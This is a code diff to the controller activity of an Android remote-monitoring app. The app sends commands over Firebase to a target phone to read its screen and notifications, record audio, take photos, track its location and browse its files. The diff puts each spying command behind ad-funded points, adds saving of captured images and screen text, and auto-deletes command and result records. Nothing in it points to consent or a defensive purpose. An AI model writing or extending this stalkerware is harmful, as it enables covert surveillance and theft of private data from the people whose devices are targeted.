@@ -27,6 +27,11 @@ import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import com.google.firebase.database.DataSnapshot
+import com.unity3d.ads.IUnityAdsInitializationListener
+import com.unity3d.ads.IUnityAdsLoadListener
+import com.unity3d.ads.IUnityAdsShowListener
+import com.unity3d.ads.UnityAds
+import com.unity3d.ads.UnityAdsShowOptions
 import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.DatabaseReference
 import com.google.firebase.database.FirebaseDatabase
@@ -58,12 +63,26 @@ class MonitorActivity : AppCompatActivity() {
     private lateinit var btnFullScreenToggle: Button
     private var isFullScreen = false
     private var lastAudioBase64: String? = null
+    private var lastImageBase64: String? = null
+    private var lastScreenReadText: String? = null
 
     // File Browser
     private var currentDirectoryPath = "/sdcard"
     private lateinit var tvCurrentPath: TextView
     private lateinit var lvFiles: android.widget.ListView
     private lateinit var pbFilesLoading: android.widget.ProgressBar
+
+    // Points Manager
+    private lateinit var pointsManager: PointsManager
+    private lateinit var tvPointsBalance: TextView
+    private lateinit var btnWatchAd: Button
+    private lateinit var etPromoCode: android.widget.EditText
+    private lateinit var btnRedeemPromo: Button
+
+    // Unity Ads
+    private val unityGameId = "1234567" // Placeholder ID, change later
+    private val testMode = true
+    private val adUnitId = "Rewarded_Android" // Default test rewarded ad unit
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -105,6 +124,54 @@ class MonitorActivity : AppCompatActivity() {
         lvFiles = findViewById(R.id.lvFiles)
         pbFilesLoading = findViewById(R.id.pbFilesLoading)
 
+        pointsManager = PointsManager(this)
+        tvPointsBalance = findViewById(R.id.tvPointsBalance)
+        btnWatchAd = findViewById(R.id.btnWatchAd)
+        etPromoCode = findViewById(R.id.etPromoCode)
+        btnRedeemPromo = findViewById(R.id.btnRedeemPromo)
+
+        updatePointsUI()
+
+        UnityAds.initialize(this, unityGameId, testMode, object : IUnityAdsInitializationListener {
+            override fun onInitializationComplete() {
+                // Initialized
+            }
+
+            override fun onInitializationFailed(error: UnityAds.UnityAdsInitializationError?, message: String?) {
+                Toast.makeText(this@MonitorActivity, "Ads init failed: $message", Toast.LENGTH_SHORT).show()
+            }
+        })
+
+        btnWatchAd.setOnClickListener {
+            showRewardedAd()
+        }
+
+        btnRedeemPromo.setOnClickListener {
+            val code = etPromoCode.text.toString().trim()
+            if (code.isNotEmpty()) {
+                val dbRef = FirebaseDatabase.getInstance().reference.child("access_codes").child(code)
+                dbRef.get().addOnSuccessListener { snapshot ->
+                    if (snapshot.exists()) {
+                        if (!pointsManager.isPromoCodeUsed(code)) {
+                            pointsManager.setPoints(99999)
+                            pointsManager.markPromoCodeUsed(code)
+                            updatePointsUI()
+                            Toast.makeText(this, "Promo code redeemed! Points set to 99999.", Toast.LENGTH_SHORT).show()
+                        } else {
+                            Toast.makeText(this, "Promo code already used.", Toast.LENGTH_SHORT).show()
+                        }
+                    } else {
+                        Toast.makeText(this, "Invalid promo code.", Toast.LENGTH_SHORT).show()
+                    }
+                    etPromoCode.text.clear()
+                }.addOnFailureListener {
+                    Toast.makeText(this, "Failed to verify promo code.", Toast.LENGTH_SHORT).show()
+                }
+            } else {
+                Toast.makeText(this, "Please enter a promo code.", Toast.LENGTH_SHORT).show()
+            }
+        }
+
         setupTabs()
         setupFileBrowser()
 
@@ -113,21 +180,41 @@ class MonitorActivity : AppCompatActivity() {
         }
 
         btnSaveAudio.setOnClickListener {
-            saveLatestAudioToDownloads()
+            checkAndDeductPoints(30, "Save Audio") {
+                saveLatestAudioToDownloads()
+            }
+        }
+
+        findViewById<Button>(R.id.btnSaveImage).setOnClickListener {
+            checkAndDeductPoints(50, "Save Image") {
+                saveLatestImageToDownloads()
+            }
+        }
+
+        findViewById<Button>(R.id.btnSaveScreen)?.setOnClickListener {
+            checkAndDeductPoints(50, "Save Screen") {
+                saveLatestScreenTextToDownloads()
+            }
         }
 
         findViewById<Button>(R.id.btnReadNotifications).setOnClickListener {
-            sendCommand("READ_NOTIFICATIONS")
-            tabLayout.getTabAt(3)?.select() // Jump to Results
+            checkAndDeductPoints(15, "Read Notifications") {
+                sendCommand("READ_NOTIFICATIONS")
+                tabLayout.getTabAt(4)?.select() // Jump to Results
+            }
         }
 
         findViewById<Button>(R.id.btnReadScreen).setOnClickListener {
-            sendCommand("READ_SCREEN")
-            tabLayout.getTabAt(1)?.select() // Jump to Screen Tab
+            checkAndDeductPoints(100, "Read Screen") {
+                sendCommand("READ_SCREEN")
+                tabLayout.getTabAt(2)?.select() // Jump to Screen Tab
+            }
         }
 
         findViewById<Button>(R.id.btnStartRecord).setOnClickListener {
-            sendCommand("START_RECORD_AUDIO")
+            checkAndDeductPoints(200, "Rec Audio") {
+                sendCommand("START_RECORD_AUDIO")
+            }
         }
 
         findViewById<Button>(R.id.btnStopRecord).setOnClickListener {
@@ -135,40 +222,59 @@ class MonitorActivity : AppCompatActivity() {
         }
 
         findViewById<Button>(R.id.btnGetLocation).setOnClickListener {
-            sendCommand("GET_LOCATION")
-            tabLayout.getTabAt(2)?.select() // Jump to Map
+            checkAndDeductPoints(150, "Location") {
+                sendCommand("GET_LOCATION")
+                tabLayout.getTabAt(3)?.select() // Jump to Map
+            }
         }
 
         findViewById<Button>(R.id.btnApps).setOnClickListener {
-            startActivity(Intent(this, AppsActivity::class.java))
+            checkAndDeductPoints(30, "View Apps") {
+                startActivity(Intent(this, AppsActivity::class.java))
+            }
         }
 
         findViewById<Button>(R.id.btnDeviceStats).setOnClickListener {
-            startActivity(Intent(this, DeviceStatsActivity::class.java))
+            checkAndDeductPoints(10, "Device Stats") {
+                startActivity(Intent(this, DeviceStatsActivity::class.java))
+            }
         }
 
         findViewById<Button>(R.id.btnAppUsageStats).setOnClickListener {
-            sendCommand("GET_APP_USAGE")
+            checkAndDeductPoints(5, "App Usage") {
+                sendCommand("GET_APP_USAGE")
+                tabLayout.getTabAt(4)?.select() // Jump to Results
+            }
         }
 
         findViewById<Button>(R.id.btnPlayAlarm).setOnClickListener {
-            sendCommand("PLAY_ALARM")
+            checkAndDeductPoints(250, "Play Alarm") {
+                sendCommand("PLAY_ALARM")
+            }
         }
 
         findViewById<Button>(R.id.btnCapturePhoto).setOnClickListener {
-            sendCommand("CAPTURE_PHOTO")
+            checkAndDeductPoints(300, "Capture Photo") {
+                sendCommand("CAPTURE_PHOTO")
+                tabLayout.getTabAt(4)?.select() // Jump to Results
+            }
         }
 
         findViewById<Button>(R.id.btnGetDeviceInfo)?.setOnClickListener {
-            sendCommand("GET_DEVICE_INFO")
+            checkAndDeductPoints(10, "Fetch Info") {
+                sendCommand("GET_DEVICE_INFO")
+                tabLayout.getTabAt(4)?.select() // Jump to Results
+            }
         }
 
         findViewById<Button>(R.id.btnLaunchApp)?.setOnClickListener {
             val et = findViewById<com.google.android.material.textfield.TextInputEditText>(R.id.etLaunchAppPackage)
             val pkg = et.text.toString().trim()
             if (pkg.isNotEmpty()) {
-                sendCommand("LAUNCH_APP:$pkg")
-                et.text?.clear()
+                checkAndDeductPoints(100, "Launch App") {
+                    sendCommand("LAUNCH_APP:$pkg")
+                    et.text?.clear()
+                }
             } else {
                 Toast.makeText(this, "Enter a package name", Toast.LENGTH_SHORT).show()
             }
@@ -179,6 +285,7 @@ class MonitorActivity : AppCompatActivity() {
         }
 
         listenForResults()
+        cleanupOldData()
     }
 
     override fun onResume() {
@@ -212,8 +319,10 @@ class MonitorActivity : AppCompatActivity() {
                         tabFiles.visibility = View.VISIBLE
                         // Load files if they haven't been loaded yet
                         if (lvFiles.adapter == null) {
-                            sendCommand("LIST_FILES:$currentDirectoryPath")
-                            pbFilesLoading.visibility = View.VISIBLE
+                            checkAndDeductPoints(600, "Access Files") {
+                                sendCommand("LIST_FILES:$currentDirectoryPath")
+                                pbFilesLoading.visibility = View.VISIBLE
+                            }
                         }
                     }
                     2 -> tabScreen.visibility = View.VISIBLE
@@ -290,6 +399,55 @@ class MonitorActivity : AppCompatActivity() {
         finish()
     }
 
+    private fun showRewardedAd() {
+        btnWatchAd.isEnabled = false
+        btnWatchAd.text = "Loading Ad..."
+        UnityAds.load(adUnitId, object : IUnityAdsLoadListener {
+            override fun onUnityAdsAdLoaded(placementId: String) {
+                UnityAds.show(this@MonitorActivity, adUnitId, UnityAdsShowOptions(), object : IUnityAdsShowListener {
+                    override fun onUnityAdsShowFailure(placementId: String, error: UnityAds.UnityAdsShowError, message: String) {
+                        Toast.makeText(this@MonitorActivity, "Failed to show ad.", Toast.LENGTH_SHORT).show()
+                        btnWatchAd.isEnabled = true
+                        btnWatchAd.text = "Watch Ad"
+                    }
+
+                    override fun onUnityAdsShowStart(placementId: String) {}
+                    override fun onUnityAdsShowClick(placementId: String) {}
+
+                    override fun onUnityAdsShowComplete(placementId: String, state: UnityAds.UnityAdsShowCompletionState) {
+                        btnWatchAd.isEnabled = true
+                        btnWatchAd.text = "Watch Ad"
+                        if (state == UnityAds.UnityAdsShowCompletionState.COMPLETED) {
+                            val earnedPoints = (50..100).random()
+                            pointsManager.addPoints(earnedPoints)
+                            updatePointsUI()
+                            Toast.makeText(this@MonitorActivity, "You earned $earnedPoints points!", Toast.LENGTH_LONG).show()
+                        }
+                    }
+                })
+            }
+
+            override fun onUnityAdsFailedToLoad(placementId: String, error: UnityAds.UnityAdsLoadError, message: String) {
+                Toast.makeText(this@MonitorActivity, "Failed to load ad: $message", Toast.LENGTH_SHORT).show()
+                btnWatchAd.isEnabled = true
+                btnWatchAd.text = "Watch Ad"
+            }
+        })
+    }
+
+    private fun updatePointsUI() {
+        tvPointsBalance.text = "Points: ${pointsManager.getPoints()}"
+    }
+
+    private fun checkAndDeductPoints(cost: Int, commandName: String, action: () -> Unit) {
+        if (pointsManager.deductPoints(cost)) {
+            updatePointsUI()
+            action()
+        } else {
+            Toast.makeText(this, "Not enough points for $commandName (Need $cost). Watch an ad!", Toast.LENGTH_LONG).show()
+        }
+    }
+
     private fun sendCommand(command: String) {
         val commandRef = database.child("commands").push()
         val data = mapOf(
@@ -299,6 +457,28 @@ class MonitorActivity : AppCompatActivity() {
         commandRef.setValue(data).addOnSuccessListener {
             Toast.makeText(this, "Command sent: $command", Toast.LENGTH_SHORT).show()
         }
+    }
+
+    private fun cleanupOldData() {
+        val oneHourAgo = System.currentTimeMillis() - 3600000.0 // 1 hour in ms
+
+        database.child("results").orderByChild("timestamp").endAt(oneHourAgo).addListenerForSingleValueEvent(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                for (child in snapshot.children) {
+                    child.ref.removeValue()
+                }
+            }
+            override fun onCancelled(error: DatabaseError) {}
+        })
+
+        database.child("commands").orderByChild("timestamp").endAt(oneHourAgo).addListenerForSingleValueEvent(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                for (child in snapshot.children) {
+                    child.ref.removeValue()
+                }
+            }
+            override fun onCancelled(error: DatabaseError) {}
+        })
     }
 
     private fun listenForResults() {
@@ -392,6 +572,7 @@ class MonitorActivity : AppCompatActivity() {
                     tv.text = "Screen Read Received and Rendered in Screen Tab."
                     tv.setTypeface(null, android.graphics.Typeface.BOLD)
                     container.addView(tv)
+                    lastScreenReadText = data
                     buildScreenReadUI(data) // Parse and pass to ScreenReconstructionView
 
                     // Switch to Screen tab if not already there
@@ -411,6 +592,8 @@ class MonitorActivity : AppCompatActivity() {
                 tv.text = "Image received."
                 container.addView(tv)
                 try {
+                    lastImageBase64 = data
+                    findViewById<Button>(R.id.btnSaveImage).visibility = View.VISIBLE
                     val bytes = Base64.decode(data, Base64.DEFAULT)
                     val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
 
@@ -568,6 +751,87 @@ class MonitorActivity : AppCompatActivity() {
             }
         } catch (e: Exception) {
             Toast.makeText(this, "Error saving audio: ${e.message}", Toast.LENGTH_LONG).show()
+        }
+    }
+
+    private fun saveLatestImageToDownloads() {
+        val imageBase64 = lastImageBase64
+        if (imageBase64 == null) {
+            Toast.makeText(this, "No image to save.", Toast.LENGTH_SHORT).show()
+            return
+        }
+
+        try {
+            val imageBytes = Base64.decode(imageBase64, Base64.DEFAULT)
+            val fileName = "x24_image_${System.currentTimeMillis()}.jpg"
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                val resolver = applicationContext.contentResolver
+                val contentValues = ContentValues().apply {
+                    put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
+                    put(MediaStore.MediaColumns.MIME_TYPE, "image/jpeg")
+                    put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)
+                }
+
+                val uri = resolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, contentValues)
+                if (uri != null) {
+                    resolver.openOutputStream(uri)?.use { outputStream ->
+                        outputStream.write(imageBytes)
+                    }
+                    Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
+                } else {
+                    Toast.makeText(this, "Failed to create MediaStore entry", Toast.LENGTH_SHORT).show()
+                }
+            } else {
+                val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
+                val file = File(downloadsDir, fileName)
+                FileOutputStream(file).use { fos ->
+                    fos.write(imageBytes)
+                }
+                Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
+            }
+        } catch (e: Exception) {
+            Toast.makeText(this, "Error saving image: ${e.message}", Toast.LENGTH_LONG).show()
+        }
+    }
+
+    private fun saveLatestScreenTextToDownloads() {
+        val screenText = lastScreenReadText
+        if (screenText == null) {
+            Toast.makeText(this, "No screen text to save.", Toast.LENGTH_SHORT).show()
+            return
+        }
+
+        try {
+            val fileName = "x24_screen_${System.currentTimeMillis()}.txt"
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                val resolver = applicationContext.contentResolver
+                val contentValues = ContentValues().apply {
+                    put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
+                    put(MediaStore.MediaColumns.MIME_TYPE, "text/plain")
+                    put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)
+                }
+
+                val uri = resolver.insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, contentValues)
+                if (uri != null) {
+                    resolver.openOutputStream(uri)?.use { outputStream ->
+                        outputStream.write(screenText.toByteArray())
+                    }
+                    Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
+                } else {
+                    Toast.makeText(this, "Failed to create MediaStore entry", Toast.LENGTH_SHORT).show()
+                }
+            } else {
+                val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
+                val file = File(downloadsDir, fileName)
+                FileOutputStream(file).use { fos ->
+                    fos.write(screenText.toByteArray())
+                }
+                Toast.makeText(this, "Saved to Downloads: $fileName", Toast.LENGTH_LONG).show()
+            }
+        } catch (e: Exception) {
+            Toast.makeText(this, "Error saving screen text: ${e.message}", Toast.LENGTH_LONG).show()
         }
     }
 }
